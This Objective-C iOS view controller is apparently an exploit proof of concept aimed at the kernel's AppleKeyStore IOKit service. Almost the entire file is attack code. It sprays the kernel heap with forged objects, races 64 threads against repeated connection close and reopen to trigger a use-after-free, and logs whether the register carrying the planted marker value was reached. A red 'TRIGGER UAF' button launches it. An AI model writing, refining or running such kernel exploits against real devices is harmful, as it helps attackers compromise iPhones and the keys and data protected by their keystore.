#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE  "AppleKeyStore"
#define NUM_RACERS   64
#define MAX_ATTEMPTS 5000
#define SPRAY_COUNT         1000
#define SPRAY_DELAY_MS      50
#define REFILL_INTERVAL     10

static atomic_int   g_phase  = 0;
static io_connect_t g_conn   = IO_OBJECT_NULL;
static atomic_uint  g_calls  = 0;
static atomic_uint  g_errors = 0;
static atomic_int   g_should_stop = 0;
static io_connect_t g_spray_conns[SPRAY_COUNT];
static int g_spray_count = 0;

typedef struct {
    uint64_t vtable;
    uint64_t lock;
    uint64_t refcount;
    uint64_t pad1[31];
    uint64_t target_at_0x110;
    uint64_t marker_0x118;
    uint64_t marker_0x120;
    uint64_t marker_0x128;
    uint64_t marker_0x130;
    uint64_t marker_0x138;
    uint64_t pad2[88];
} __attribute__((packed)) fake_gate_t;

_Static_assert(sizeof(fake_gate_t) == 1024, "fake_gate_t must be 1024 bytes");
_Static_assert(offsetof(fake_gate_t, target_at_0x110) == 0x110, "target_at_0x110 must be at offset 0x110");

static void *racer_thread(void *arg) {
    (void)arg;
    while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
        pthread_yield_np();
    
    while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
        if (atomic_load(&g_should_stop)) break;
        
        uint64_t input[1] = {0xDEADBEEF};
        uint32_t out_cnt  = 0;
        kern_return_t kr = IOConnectCallMethod(g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
        
        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
            atomic_store(&g_should_stop, 1);
            break;
        }
        pthread_yield_np();
    }
    return NULL;
}

static void init_fake_gate(fake_gate_t *gate, int variant) {
    memset(gate, 0, sizeof(fake_gate_t));
    gate->vtable = 0x4141414141414141ULL;
    gate->lock = 0x0000000000000000ULL;
    gate->refcount = 0x0000000100000001ULL;
    
    for (int i = 0; i < 31; i++) {
        gate->pad1[i] = 0x2020202020202020ULL;
    }
    
    switch (variant % 6) {
        case 0:
            gate->target_at_0x110 = 0x4242424242424242ULL;
            gate->marker_0x118 = 0x4343434343434343ULL;
            gate->marker_0x120 = 0x4444444444444444ULL;
            break;
        case 1:
            gate->target_at_0x110 = 0x5252525252525252ULL;
            gate->marker_0x118 = 0x5353535353535353ULL;
            gate->marker_0x120 = 0x5454545454545454ULL;
            break;
        case 2:
            gate->target_at_0x110 = 0x6262626262626262ULL;
            gate->marker_0x118 = 0x6363636363636363ULL;
            gate->marker_0x120 = 0x6464646464646464ULL;
            break;
        case 3:
            gate->target_at_0x110 = 0x7272727272727272ULL;
            gate->marker_0x118 = 0x7373737373737373ULL;
            gate->marker_0x120 = 0x7474747474747474ULL;
            break;
        case 4:
            gate->target_at_0x110 = 0x8282828282828282ULL;
            gate->marker_0x118 = 0x8383838383838383ULL;
            gate->marker_0x120 = 0x8484848484848484ULL;
            break;
        case 5:
            gate->target_at_0x110 = 0x9292929292929292ULL;
            gate->marker_0x118 = 0x9393939393939393ULL;
            gate->marker_0x120 = 0x9494949494949494ULL;
            break;
    }
    
    gate->marker_0x128 = 0x4545454545454545ULL;
    gate->marker_0x130 = 0x4646464646464646ULL;
    gate->marker_0x138 = 0x4747474747474747ULL;
    
    for (int i = 0; i < 88; i++) {
        gate->pad2[i] = 0x3030303030303030ULL;
    }
}

static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), BOOL is_refill) {
    kern_return_t kr;
    int start_idx = is_refill ? (g_spray_count / 2) : 0;
    int target_count = is_refill ? g_spray_count : SPRAY_COUNT;
    
    if (!is_refill) {
        log_callback(@"[SPRAY] Starting heap spray...");
    }
    
    int opened = 0;
    for (int i = start_idx; i < target_count; i++) {
        if (is_refill && g_spray_conns[i] != IO_OBJECT_NULL) continue;
        
        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_spray_conns[i]);
        
        if (kr != KERN_SUCCESS) {
            if (kr == 0xe00002c7) {
                if (!is_refill) {
                    g_spray_count = i;
                    log_callback([NSString stringWithFormat:@"[SPRAY] Resource limit: %d connections", i]);
                }
                break;
            }
            g_spray_conns[i] = IO_OBJECT_NULL;
            continue;
        }
        opened++;
    }
    
    if (!is_refill && g_spray_count == 0) {
        g_spray_count = opened;
    }
    
    int sprayed = 0;
    for (int i = start_idx; i < g_spray_count; i++) {
        if (g_spray_conns[i] == IO_OBJECT_NULL) continue;
        
        fake_gate_t fakeGate;
        init_fake_gate(&fakeGate, i);
        
        uint64_t scalar_input = 0xDEADBEEF + i;
        kr = IOConnectCallMethod(g_spray_conns[i], 1, &scalar_input, 1, &fakeGate, sizeof(fakeGate), NULL, NULL, NULL, NULL);
        
        if (kr == KERN_SUCCESS) sprayed++;
    }
    
    if (!is_refill) {
        log_callback([NSString stringWithFormat:@"[SPRAY] Sprayed %d objects", sprayed]);
    }
    
    return sprayed;
}

static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
    for (int i = 0; i < g_spray_count; i++) {
        if (g_spray_conns[i] != IO_OBJECT_NULL) {
            IOServiceClose(g_spray_conns[i]);
            g_spray_conns[i] = IO_OBJECT_NULL;
        }
    }
    g_spray_count = 0;
}

@interface ViewController ()
@property (nonatomic, strong) UIButton *triggerButton;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) NSMutableString *logBuffer;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    NSLog(@"=== viewDidLoad CALLED ===");
    
    // Set background
    self.view.backgroundColor = [UIColor blackColor];
    
    self.logBuffer = [NSMutableString string];
    
    // Create button FIRST - simple and visible
    self.triggerButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.triggerButton.frame = CGRectMake(50, 100, 300, 60);
    [self.triggerButton setTitle:@"TRIGGER UAF" forState:UIControlStateNormal];
    [self.triggerButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.triggerButton.backgroundColor = [UIColor redColor];
    self.triggerButton.titleLabel.font = [UIFont boldSystemFontOfSize:20];
    [self.triggerButton addTarget:self action:@selector(runTest) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.triggerButton];
    
    NSLog(@"Button added at: %@", NSStringFromCGRect(self.triggerButton.frame));
    
    // Create log view
    self.logView = [[UITextView alloc] initWithFrame:CGRectMake(20, 180, 350, 500)];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
    self.logView.textColor = [UIColor greenColor];
    self.logView.font = [UIFont fontWithName:@"Courier" size:11];
    self.logView.editable = NO;
    [self.view addSubview:self.logView];
    
    NSLog(@"LogView added at: %@", NSStringFromCGRect(self.logView.frame));
    
    [self appendLog:@"UAF Tester v4 Ready"];
    [self appendLog:@"Tap button to start"];
    
    NSLog(@"=== viewDidLoad COMPLETE ===");
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
    NSLog(@"=== viewDidAppear - Button visible: %d ===", !self.triggerButton.hidden);
}

- (void)appendLog:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        [self.logBuffer appendFormat:@"%@\n", msg];
        self.logView.text = self.logBuffer;
        NSRange bottom = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:bottom];
    });
    NSLog(@"LOG: %@", msg);
}

- (void)runTest {
    NSLog(@"=== BUTTON TAPPED ===");
    
    self.triggerButton.enabled = NO;
    [self.triggerButton setTitle:@"RUNNING..." forState:UIControlStateNormal];
    
    [self.logBuffer setString:@""];
    [self appendLog:@"=== UAF TEST v4 ==="];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self runImprovedUAF];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.triggerButton.enabled = YES;
            [self.triggerButton setTitle:@"TRIGGER UAF" forState:UIControlStateNormal];
        });
    });
}

- (void)runImprovedUAF {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
    if (!svc) {
        [self appendLog:@"ERROR: AppleKeyStore not found"];
        return;
    }
    
    atomic_store(&g_phase, 0);
    atomic_store(&g_calls, 0);
    atomic_store(&g_errors, 0);
    atomic_store(&g_should_stop, 0);
    
    [self appendLog:@"PHASE 1: Heap Spray"];
    
    int spray_result = heap_spray_phase(svc, ^(NSString *msg) {
        [self appendLog:msg];
    }, NO);
    
    if (spray_result < 100) {
        [self appendLog:@"ERROR: Heap spray failed"];
        IOObjectRelease(svc);
        return;
    }
    
    [self appendLog:@"PHASE 2: UAF Trigger"];
    
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    if (kr != KERN_SUCCESS) {
        [self appendLog:@"ERROR: Cannot open target"];
        heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
        IOObjectRelease(svc);
        return;
    }
    
    pthread_t threads[NUM_RACERS];
    for (int i = 0; i < NUM_RACERS; i++) {
        pthread_create(&threads[i], NULL, racer_thread, NULL);
    }
    
    atomic_store_explicit(&g_phase, 1, memory_order_release);
    [self appendLog:[NSString stringWithFormat:@"Started %d racers", NUM_RACERS]];
    
    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        if (atomic_load(&g_should_stop)) {
            [self appendLog:[NSString stringWithFormat:@"UAF TRIGGERED at %d!", attempt]];
            break;
        }
        
        if (attempt > 0 && attempt % REFILL_INTERVAL == 0) {
            heap_spray_phase(svc, ^(NSString *msg) {}, YES);
        }
        
        kr = IOServiceClose(g_conn);
        usleep(1);
        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
        
        if (kr != KERN_SUCCESS) {
            [self appendLog:@"Reopen failed - possible UAF!"];
            atomic_store(&g_should_stop, 1);
            break;
        }
        
        if ((attempt + 1) % 500 == 0) {
            [self appendLog:[NSString stringWithFormat:@"Progress: %d/%d", attempt + 1, MAX_ATTEMPTS]];
        }
    }
    
    atomic_store_explicit(&g_phase, 3, memory_order_release);
    
    for (int i = 0; i < NUM_RACERS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    uint32_t total_calls = atomic_load(&g_calls);
    uint32_t total_errors = atomic_load(&g_errors);
    
    [self appendLog:@"=== RESULTS ==="];
    [self appendLog:[NSString stringWithFormat:@"Calls: %u", total_calls]];
    [self appendLog:[NSString stringWithFormat:@"Errors: %u", total_errors]];
    
    if (total_errors > 0) {
        [self appendLog:@"UAF SUCCESS!"];
        [self appendLog:@"Check crash log for x16 value"];
    } else {
        [self appendLog:@"No UAF detected"];
    }
    
    if (g_conn != IO_OBJECT_NULL) {
        IOServiceClose(g_conn);
    }
    
    heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
    IOObjectRelease(svc);
}

@end
